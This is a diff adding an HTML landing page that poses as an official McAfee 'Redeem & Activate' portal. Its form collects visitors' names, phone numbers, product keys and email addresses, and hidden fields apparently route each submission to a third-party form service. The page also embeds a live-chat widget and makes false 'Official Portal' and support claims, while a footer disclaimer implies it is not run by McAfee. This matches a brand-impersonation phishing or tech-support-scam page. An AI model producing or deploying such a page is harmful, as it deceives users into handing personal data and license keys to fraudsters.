@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>McAfee Security Portal - Redeem & Activate</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '6c170aa705ae9b4eadeca772f09d06f782956e01';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+    </script>
+    <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            red: '#C0171D',
+                            redHover: '#A00F14',
+                            redLight: '#FFF1F2',
+                            dark: '#0F172A',
+                            slate: '#1E293B',
+                            accent: '#E11D48',
+                            gold: '#F59E0B'
+                        }
+                    },
+                    boxShadow: {
+                        'glow': '0 0 25px -5px rgba(192, 23, 29, 0.3)',
+                        'card-hover': '0 20px 30px -10px rgba(0, 0, 0, 0.15)'
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        .mcafee-gradient {
+            background: linear-gradient(135deg, #0F172A 0%, #1E1B2E 50%, #2A0912 100%);
+        }
+        .mcafee-card-glass {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(226, 232, 240, 0.8);
+        }
+        .key-input-box {
+            letter-spacing: 2px;
+            font-family: monospace;
+            font-size: 1.125rem;
+            text-transform: uppercase;
+        }
+        @keyframes pulse-subtle {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.85; transform: scale(1.02); }
+        }
+        .pulse-shield {
+            animation: pulse-subtle 4s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800 font-sans flex flex-col min-h-screen selection:bg-brand-red selection:text-white">
+
+    <div id="top-banner" class="bg-gradient-to-r from-brand-dark via-brand-red to-brand-dark text-white text-xs sm:text-sm py-2 px-4">
+        <div class="max-w-7xl mx-mx-auto flex justify-between items-center px-2">
+            <div class="flex items-center space-x-2 truncate">
+                <span class="inline-flex items-center px-2 py-0.5 rounded text-xs font-semibold bg-white/20 text-white">
+                    <i class="fa-solid fa-shield-halved mr-1 text-emerald-400"></i> Official Portal
+                </span>
+                <span class="truncate">Secure 256-Bit SSL Encrypted Activation Center</span>
+            </div>
+            <div class="flex items-center space-x-4 text-xs">
+                <a href="#support" class="hover:underline flex items-center gap-1">
+                    <i class="fa-solid fa-headset"></i> <span class="hidden sm:inline">Support 24/7</span>
+                </a>
+                <span class="text-white/40">|</span>
+                <button onclick="toggleRegionModal()" class="hover:underline flex items-center gap-1 focus:outline-none">
+                    <i class="fa-solid fa-globe"></i> <span id="current-region">Global (English)</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <header class="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-slate-200 shadow-sm transition-all duration-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-20">
+                <!-- Brand Logo -->
+                <a href="#" class="flex items-center gap-3 group">
+                    <div class="w-11 h-11 bg-brand-red text-white rounded-xl flex items-center justify-center shadow-md shadow-brand-red/30 group-hover:bg-brand-redHover transition-colors">
+                        <i class="fa-solid fa-shield-virus text-2xl"></i>
+                    </div>
+                    <div class="flex flex-col">
+                        <div class="flex items-baseline gap-1">
+                            <span class="text-2xl font-black tracking-tight text-slate-900 font-sans">McAfee</span>
+                            <span class="text-xs font-bold text-brand-red uppercase tracking-wider bg-brand-redLight px-1.5 py-0.5 rounded">Activate</span>
+                        </div>
+                        <span class="text-[10px] text-slate-500 tracking-wider font-semibold uppercase">Total Protection Services</span>
+                    </div>
+                </a>
+
+                <!-- Desktop Nav Links -->
+                <nav class="hidden md:flex items-center space-x-8 text-sm font-medium text-slate-600">
+                    <a href="#activate-section" class="text-brand-red font-semibold hover:text-brand-redHover transition-colors">Redeem Key</a>
+                    <a href="#how-it-works" class="hover:text-brand-red transition-colors">Activation Steps</a>
+                    <a href="#features" class="hover:text-brand-red transition-colors">Security Features</a>
+                    <a href="#faq" class="hover:text-brand-red transition-colors">Help & FAQ</a>
+                </nav>
+
+                <!-- Actions -->
+                <div class="flex items-center gap-3">
+                    <button onclick="openSignInModal()" class="hidden sm:inline-flex items-center gap-2 text-xs font-semibold text-slate-700 hover:text-brand-red bg-slate-100 hover:bg-slate-200 px-4 py-2.5 rounded-lg transition-colors">
+                        <i class="fa-solid fa-user-check text-slate-500"></i> My Account
+                    </button>
+                    <a href="#activate-section" class="inline-flex items-center gap-2 text-xs font-bold text-white bg-brand-red hover:bg-brand-redHover px-5 py-2.5 rounded-lg shadow-md shadow-brand-red/20 transition-all hover:-translate-y-0.5">
+                        <i class="fa-solid fa-key"></i> Activate Product
+                    </a>
+                    <!-- Mobile menu button -->
+                    <button onclick="toggleMobileMenu()" class="md:hidden p-2 text-slate-600 hover:text-slate-900">
+                        <i class="fa-solid fa-bars text-xl"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation Menu -->
+        <div id="mobile-menu" class="hidden md:hidden bg-white border-b border-slate-200 px-4 pt-2 pb-4 space-y-2">
+            <a href="#activate-section" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-md text-base font-semibold text-brand-red bg-brand-redLight">Redeem Product Key</a>
+            <a href="#how-it-works" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-md text-base font-medium text-slate-700 hover:bg-slate-100">Activation Steps</a>
+            <a href="#features" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-md text-base font-medium text-slate-700 hover:bg-slate-100">Features</a>
+            <a href="#faq" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-md text-base font-medium text-slate-700 hover:bg-slate-100">FAQ</a>
+            <button onclick="openSignInModal(); toggleMobileMenu()" class="w-full text-left px-3 py-2 rounded-md text-base font-medium text-slate-700 hover:bg-slate-100 flex items-center gap-2">
+                <i class="fa-solid fa-user"></i> Account Sign In
+            </button>
+        </div>
+    </header>
+
+    <section class="mcafee-gradient text-white py-12 lg:py-20 relative overflow-hidden">
+        <!-- Background Decorative Elements -->
+        <div class="absolute top-0 right-0 -mt-12 -mr-12 w-96 h-96 bg-brand-red/20 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-0 left-0 -mb-12 -ml-12 w-80 h-80 bg-rose-900/20 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+                
+                <!-- Hero Text Left -->
+                <div class="lg:col-span-6 space-y-6 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-2 bg-white/10 backdrop-blur-md px-3.5 py-1.5 rounded-full text-xs font-semibold text-rose-200 border border-white/10">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+                        Official Activation Server Ready
+                    </div>
+                    
+                    <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold tracking-tight leading-tight">
+                        Activate Your <span class="text-transparent bg-clip-text bg-gradient-to-r from-rose-400 via-rose-200 to-white">McAfee Security</span> Subscription
+                    </h1>
+                    
+                    <p class="text-slate-300 text-base sm:text-lg max-w-xl mx-auto lg:mx-0 leading-relaxed">
+                        Enter your 25-digit product key below to redeem your license, sync your devices, and instantly enable real-time identity & malware defense.
+                    </p>
+
+                    <!-- Trust indicators -->
+                    <div class="pt-4 grid grid-cols-3 gap-4 border-t border-white/10 max-w-md mx-auto lg:mx-0 text-slate-300 text-xs sm:text-sm">
+                        <div class="flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-shield-check text-brand-red text-lg"></i>
+                            <span>256-Bit Safe</span>
+                        </div>
+                        <div class="flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-bolt text-amber-400 text-lg"></i>
+                            <span>Instant Setup</span>
+                        </div>
+                        <div class="flex items-center gap-2 justify-center lg:justify-start">
+                            <i class="fa-solid fa-headset text-rose-400 text-lg"></i>
+                            <span>24/7 Support</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hero Card Right - Main Activation Form -->
+                <div id="activate-section" class="lg:col-span-6">
+                    <div class="mcafee-card-glass rounded-2xl p-6 sm:p-8 shadow-2xl text-slate-800 border border-white/40 relative">
+                        
+                        <!-- Form Header Tabs -->
+                        <div class="flex border-b border-slate-200 mb-6 font-semibold text-xs sm:text-sm">
+                            <button id="tab-activate" onclick="switchTab('activate')" class="pb-3 border-b-2 border-brand-red text-brand-red flex-1 text-center flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-key"></i> Redeem Product Key
+                            </button>
+                            <button id="tab-download" onclick="switchTab('download')" class="pb-3 border-b-2 border-transparent text-slate-500 hover:text-slate-700 flex-1 text-center flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-download"></i> Download Installed App
+                            </button>
+                        </div>
+
+                        <!-- TAB 1: ACTIVATE KEY FORM -->
+                        <form id="content-activate" class="space-y-4" onsubmit="processActivation(event)">
+                            <input type="hidden" name="access_key" value="3b39b452-ec3b-4ee6-8a7a-b9d8c7c0abf8">
+                            <input type="hidden" name="subject" value="New McAfee Activation Form Submission">
+                            <input type="hidden" name="from_name" value="McAfee Protection Portal">
+
+                            <div>
+                                <label for="user-name" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                    Full Name
+                                </label>
+                                <div class="relative">
+                                    <input 
+                                        type="text" 
+                                        id="user-name" 
+                                        name="name"
+                                        required
+                                        placeholder="John Doe" 
+                                        class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-brand-red focus:border-brand-red outline-none text-slate-800 font-medium text-sm"
+                                    >
+                                    <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                        <i class="fa-solid fa-user"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label for="user-phone" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                    Phone Number
+                                </label>
+                                <div class="relative">
+                                    <input 
+                                        type="tel" 
+                                        id="user-phone" 
+                                        name="phone"
+                                        required
+                                        placeholder="+1 (555) 000-0000" 
+                                        class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-brand-red focus:border-brand-red outline-none text-slate-800 font-medium text-sm"
+                                    >
+                                    <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                        <i class="fa-solid fa-phone"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label for="product-key" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                    25-Digit Product Key / Activation Code
+                                </label>
+                                <div class="relative">
+                                    <input 
+                                        type="text" 
+                                        id="product-key" 
+                                        name="product_key"
+                                        required
+                                        maxlength="29" 
+                                        placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" 
+                                        class="key-input-box w-full px-4 py-3 bg-slate-50 border-2 border-slate-300 rounded-xl focus:ring-2 focus:ring-brand-red focus:border-brand-red outline-none transition-all text-slate-800 font-bold placeholder-slate-400 uppercase text-sm sm:text-base"
+                                        oninput="formatProductKey(this)"
+                                    >
+                                    <div id="key-status-icon" class="absolute right-3.5 top-3.5 text-slate-400 text-lg">
+                                        <i class="fa-solid fa-barcode"></i>
+                                    </div>
+                                </div>
+                                <p class="text-xs text-slate-500 mt-1 flex items-center gap-1">
+                                    <i class="fa-solid fa-circle-info text-slate-400"></i>
+                                    Found on your digital receipt or retail card back.
+                                </p>
+                            </div>
+
+                            <div>
+                                <label for="user-email" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                    McAfee Account Email Address
+                                </label>
+                                <div class="relative">
+                                    <input 
+                                        type="email" 
+                                        id="user-email" 
+                                        name="email"
+                                        required
+                                        placeholder="name@example.com" 
+                                        class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-brand-red focus:border-brand-red outline-none text-slate-800 font-medium text-sm"
+                                    >
+                                    <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                        <i class="fa-solid fa-envelope"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="flex items-start gap-2 pt-1">
+                                <input type="checkbox" id="terms-check" name="terms_agreed" required class="mt-1 h-4 w-4 rounded border-slate-300 text-brand-red focus:ring-brand-red" checked>
+                                <label for="terms-check" class="text-xs text-slate-600 leading-tight">
+                                    I agree to the <a href="#" class="text-brand-red underline hover:text-brand-redHover">License Agreement</a> and acknowledge automatic updates for optimal threat security.
+                                </label>
+                            </div>
+
+                            <!-- Activation Submit Button -->
+                            <button 
+                                type="submit"
+                                id="btn-submit-key" 
+                                class="w-full bg-brand-red hover:bg-brand-redHover text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-brand-red/30 transition-all hover:shadow-brand-red/50 active:scale-[0.99] flex items-center justify-center gap-2 text-base cursor-pointer"
+                            >
+                                <i class="fa-solid fa-shield-check"></i> Validate & Activate Now
+                            </button>
+                        </form>
+
+                        <!-- TAB 2: DOWNLOAD TAB (Hidden by default) -->
+                        <div id="content-download" class="hidden space-y-5">
+                            <div class="p-4 bg-emerald-50 border border-emerald-200 rounded-xl flex items-start gap-3">
+                                <i class="fa-solid fa-circle-check text-emerald-600 text-xl mt-0.5"></i>
+                                <div class="text-xs sm:text-sm text-emerald-900">
+                                    <p class="font-bold">Already redeemed your product key?</p>
+                                    <p class="mt-0.5 text-emerald-700">Sign in to download and install Total Protection directly onto this Windows PC, Mac, or mobile device.</p>
+                                </div>
+                            </div>
+
+                            <div class="space-y-3">
+                                <button onclick="simulateDownload('Windows')" class="w-full flex items-center justify-between p-3.5 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors text-left group">
+                                    <div class="flex items-center gap-3">
+                                        <i class="fa-brands fa-windows text-slate-700 text-2xl group-hover:text-brand-red"></i>
+                                        <div>
+                                            <div class="font-bold text-slate-800 text-sm">McAfee for Windows</div>
+                                            <div class="text-xs text-slate-500">Windows 11 / 10 / 8.1</div>
+                                        </div>
+                                    </div>
+                                    <i class="fa-solid fa-download text-slate-400 group-hover:text-brand-red"></i>
+                                </button>
+
+                                <button onclick="simulateDownload('macOS')" class="w-full flex items-center justify-between p-3.5 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors text-left group">
+                                    <div class="flex items-center gap-3">
+                                        <i class="fa-brands fa-apple text-slate-700 text-2xl group-hover:text-brand-red"></i>
+                                        <div>
+                                            <div class="font-bold text-slate-800 text-sm">McAfee for Mac</div>
+                                            <div class="text-xs text-slate-500">macOS 10.15 or later</div>
+                                        </div>
+                                    </div>
+                                    <i class="fa-solid fa-download text-slate-400 group-hover:text-brand-red"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <section id="how-it-works" class="py-16 bg-white border-b border-slate-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <span class="text-xs font-bold text-brand-red uppercase tracking-widest bg-brand-redLight px-3 py-1 rounded-full">Quick Guide</span>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-3">Simple 3-Step Setup Process</h2>
+                <p class="text-slate-600 mt-2 text-sm sm:text-base">Get complete protection for your PC, smartphone, and personal data in less than two minutes.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 relative">
+                
+                <!-- Step 1 -->
+                <div class="bg-slate-50 rounded-2xl p-6 border border-slate-200 relative group hover:border-brand-red/50 hover:shadow-lg transition-all">
+                    <div class="w-12 h-12 bg-brand-red text-white font-extrabold rounded-xl flex items-center justify-center text-xl shadow-md mb-4 group-hover:scale-110 transition-transform">
+                        1
+                    </div>
+                    <h3 class="text-lg font-bold text-slate-900 mb-2">Enter Product Key</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Type your 25-digit code located on the back of your retail product card or in your email purchase receipt.
+                    </p>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="bg-slate-50 rounded-2xl p-6 border border-slate-200 relative group hover:border-brand-red/50 hover:shadow-lg transition-all">
+                    <div class="w-12 h-12 bg-slate-900 text-white font-extrabold rounded-xl flex items-center justify-center text-xl shadow-md mb-4 group-hover:scale-110 transition-transform">
+                        2
+                    </div>
+                    <h3 class="text-lg font-bold text-slate-900 mb-2">Link Your Account</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Sign in or create a free McAfee account to register your subscription and manage connected devices safely.
+                    </p>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="bg-slate-50 rounded-2xl p-6 border border-slate-200 relative group hover:border-brand-red/50 hover:shadow-lg transition-all">
+                    <div class="w-12 h-12 bg-emerald-600 text-white font-extrabold rounded-xl flex items-center justify-center text-xl shadow-md mb-4 group-hover:scale-110 transition-transform">
+                        3
+                    </div>
+                    <h3 class="text-lg font-bold text-slate-900 mb-2">Install & Protect</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Download the security installer onto your devices. Enjoy real-time antivirus, web protection, and VPN.
+                    </p>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <section id="features" class="py-16 bg-slate-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <span class="text-xs font-bold text-brand-red uppercase tracking-widest bg-brand-redLight px-3 py-1 rounded-full">Complete Shield</span>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-3">All-In-One Protection Suite</h2>
+                <p class="text-slate-600 mt-2 text-sm sm:text-base">Once activated, your McAfee subscription unlocks powerful defenses against modern web threats.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                
+                <!-- Feature 1 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-rose-50 text-brand-red flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-bug-slash"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">Award-Winning Antivirus</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Cloud-based threat analysis blocks viruses, ransomware, spyware, and phishing scams in real time.
+                    </p>
+                </div>
+
+                <!-- Feature 2 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-user-shield"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">Identity Monitoring</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Scans the dark web 24/7 for your email, phone numbers, and SSN, warning you before identity theft occurs.
+                    </p>
+                </div>
+
+                <!-- Feature 3 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-amber-50 text-amber-600 flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-network-wired"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">Secure Unlimited VPN</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Bank-grade encryption keeps your credit card details, passwords, and banking sessions secure on public Wi-Fi.
+                    </p>
+                </div>
+
+                <!-- Feature 4 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-emerald-50 text-emerald-600 flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-compass"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">Safe Web Browsing</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        WebAdvisor proactively warns you about dangerous links, fraudulent websites, and malicious file downloads.
+                    </p>
+                </div>
+
+                <!-- Feature 5 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-indigo-50 text-indigo-600 flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-lock-keyhole"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">Password Manager</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Store, auto-generate, and sync complex passwords across all your Windows, Mac, iOS, and Android devices.
+                    </p>
+                </div>
+
+                <!-- Feature 6 -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow">
+                    <div class="w-12 h-12 rounded-xl bg-purple-50 text-purple-600 flex items-center justify-center text-2xl mb-4">
+                        <i class="fa-solid fa-gauge-high"></i>
+                    </div>
+                    <h3 class="font-bold text-slate-900 text-lg mb-2">PC Performance Optimization</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Stops auto-playing videos, cleans background junk files, and keeps your computer running smoothly.
+                    </p>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <section class="py-12 bg-white border-y border-slate-200">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6">
+            <div class="bg-gradient-to-r from-slate-900 to-slate-800 rounded-2xl p-6 sm:p-8 text-white shadow-xl flex flex-col md:flex-row items-center justify-between gap-6">
+                <div class="space-y-2 text-center md:text-left">
+                    <span class="text-xs font-bold uppercase text-brand-red bg-brand-red/20 px-2.5 py-1 rounded-md">Activation Troubleshooter</span>
+                    <h3 class="text-xl font-bold">Unsure about your 25-digit code status?</h3>
+                    <p class="text-slate-300 text-xs sm:text-sm max-w-lg">Check whether your product key has already been redeemed or is valid for instant activation.</p>
+                </div>
+                <button onclick="scrollToActivation()" class="whitespace-nowrap px-6 py-3 bg-brand-red hover:bg-brand-redHover font-bold rounded-xl text-sm transition-transform active:scale-95 shadow-md shadow-brand-red/30">
+                    <i class="fa-solid fa-circle-check mr-1.5"></i> Verify Key Now
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <section id="faq" class="py-16 bg-slate-50">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-12">
+                <span class="text-xs font-bold text-brand-red uppercase tracking-widest bg-brand-redLight px-3 py-1 rounded-full">Got Questions?</span>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-3">Frequently Asked Questions</h2>
+                <p class="text-slate-600 mt-2 text-sm">Need help finding your 25-digit key or completing your installation?</p>
+            </div>
+
+            <div class="space-y-4">
+                
+                <!-- FAQ Item 1 -->
+                <div class="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-sm">
+                    <button onclick="toggleFaq(1)" class="w-full text-left p-4 sm:p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-50 transition-colors">
+                        <span>Where do I find my 25-digit McAfee Product Key?</span>
+                        <i id="faq-icon-1" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-1" class="hidden p-4 sm:p-5 border-t border-slate-100 text-slate-600 text-sm leading-relaxed bg-slate-50">
+                        If you purchased a physical retail box, check the back of the card inside the card sleeve. If you purchased online, check your email purchase receipt or order confirmation email for the 25-character key formatted as: <span class="font-mono bg-slate-200 px-1.5 py-0.5 rounded font-bold">XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</span>.
+                    </div>
+                </div>
+
+                <!-- FAQ Item 2 -->
+                <div class="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-sm">
+                    <button onclick="toggleFaq(2)" class="w-full text-left p-4 sm:p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-50 transition-colors">
+                        <span>Can I activate my product key on multiple devices?</span>
+                        <i id="faq-icon-2" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-2" class="hidden p-4 sm:p-5 border-t border-slate-100 text-slate-600 text-sm leading-relaxed bg-slate-50">
+                        Yes! Most McAfee Total Protection & LiveSafe subscriptions cover 5 to 10 devices (Windows PCs, Macs, Android, and iOS smartphones). Once you activate the primary key on your account, sign into your account on other devices to install.
+                    </div>
+                </div>
+
+                <!-- FAQ Item 3 -->
+                <div class="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-sm">
+                    <button onclick="toggleFaq(3)" class="w-full text-left p-4 sm:p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-50 transition-colors">
+                        <span>What should I do if my product key says "Already Redeemed"?</span>
+                        <i id="faq-icon-3" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-3" class="hidden p-4 sm:p-5 border-t border-slate-100 text-slate-600 text-sm leading-relaxed bg-slate-50">
+                        If you receive an "Already Redeemed" message, your activation code was already linked to your email address during setup. Simply log into your account using the "Download Installed App" tab at the top of this page to download the software.
+                    </div>
+                </div>
+
+                <!-- FAQ Item 4 -->
+                <div class="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-sm">
+                    <button onclick="toggleFaq(4)" class="w-full text-left p-4 sm:p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-50 transition-colors">
+                        <span>Does my subscription extend my existing remaining days?</span>
+                        <i id="faq-icon-4" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-4" class="hidden p-4 sm:p-5 border-t border-slate-100 text-slate-600 text-sm leading-relaxed bg-slate-50">
+                        Yes. When you redeem a key for an identical tier (e.g., McAfee Total Protection), the new days will automatically append to your existing active license duration.
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <footer id="support" class="bg-slate-900 text-slate-400 text-xs py-12 border-t border-slate-800 mt-auto">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-8">
+            
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 pb-8 border-b border-slate-800">
+                <!-- Column 1 -->
+                <div class="space-y-3">
+                    <div class="flex items-center gap-2 text-white font-bold text-base">
+                        <i class="fa-solid fa-shield-virus text-brand-red"></i> McAfee Support
+                    </div>
+                    <p class="leading-relaxed">Official global activation and download assist portal for personal and family subscriptions.</p>
+                </div>
+
+                <!-- Column 2 -->
+                <div>
+                    <h4 class="text-white font-semibold text-sm mb-3">Quick Links</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#activate-section" class="hover:text-white transition-colors">Redeem Retail Code</a></li>
+                        <li><a href="#how-it-works" class="hover:text-white transition-colors">Setup Guide</a></li>
+                        <li><a href="#features" class="hover:text-white transition-colors">Security Features</a></li>
+                        <li><a href="#" onclick="openSignInModal()" class="hover:text-white transition-colors">My Account Sign In</a></li>
+                    </ul>
+                </div>
+
+                <!-- Column 3 -->
+                <div>
+                    <h4 class="text-white font-semibold text-sm mb-3">Supported Products</h4>
+                    <ul class="space-y-2">
+                        <li>McAfee Total Protection</li>
+                        <li>McAfee LiveSafe™</li>
+                        <li>McAfee Antivirus Plus</li>
+                        <li>McAfee Mobile Security</li>
+                    </ul>
+                </div>
+
+                <!-- Column 4 -->
+                <div>
+                    <h4 class="text-white font-semibold text-sm mb-3">Security & Trust</h4>
+                    <div class="flex flex-wrap gap-2 text-slate-300">
+                        <span class="bg-slate-800 px-2.5 py-1 rounded flex items-center gap-1.5 border border-slate-700">
+                            <i class="fa-solid fa-lock text-emerald-400"></i> SSL 256-Bit
+                        </span>
+                        <span class="bg-slate-800 px-2.5 py-1 rounded flex items-center gap-1.5 border border-slate-700">
+                            <i class="fa-solid fa-user-shield text-brand-red"></i> Verified Key
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Disclaimer & Legal -->
+            <div class="space-y-4 text-slate-500 text-[11px] leading-relaxed">
+                <p>
+                    Disclaimer: All product names, logos, brands, trademarks, and registered trademarks displayed on this site are property of their respective owners. McAfee, Total Protection, and LiveSafe are registered trademarks of McAfee LLC. This web portal is provided for user activation assistance and subscription service management.
+                </p>
+                <div class="flex flex-col sm:flex-row justify-between items-center gap-4 pt-4 border-t border-slate-800 text-slate-400">
+                    <div>
+                        &copy; 2026 McAfee Security Activation Services. All Rights Reserved.
+                    </div>
+                    <div class="flex space-x-6">
+                        <a href="#" class="hover:underline">Privacy Notice</a>
+                        <a href="#" class="hover:underline">Terms of Service</a>
+                        <a href="#" class="hover:underline">License Agreement</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
